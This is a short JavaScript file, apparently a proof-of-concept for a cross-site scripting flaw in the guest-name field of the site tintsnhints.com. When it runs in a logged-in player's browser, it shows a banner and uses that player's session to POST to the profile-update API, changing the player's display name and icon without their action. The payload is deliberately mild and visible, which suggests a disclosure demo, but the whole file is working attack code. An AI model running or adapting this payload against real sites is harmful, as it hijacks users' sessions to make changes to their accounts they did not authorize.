// Demo for the guest-name bug on tintsnhints.com.
// When this file runs in a logged-in player's browser, it uses that
// browser's own session to change only that player's display name and icon.
(async function () {
  const displayName = 'XSS Demo';
  const preferredIcon = '👻';

  const banner = document.createElement('div');
  banner.textContent = 'Guest script running…';
  banner.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:99999;background:#9b1c1c;color:#fff;padding:14px;text-align:center;font:600 18px sans-serif';
  document.body.prepend(banner);

  try {
    const response = await fetch('/api/profile/update', {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        display_name: displayName,
        preferred_icon: preferredIcon
      })
    });
    const data = await response.json().catch(() => ({}));

    if (response.ok && data.success) {
      banner.textContent = 'Profile updated to ' + displayName + ' ' + preferredIcon;
    } else {
      banner.textContent = 'Profile was not changed. Join the room while logged in.';
    }
  } catch (error) {
    banner.textContent = 'Profile update failed.';
  }
})();
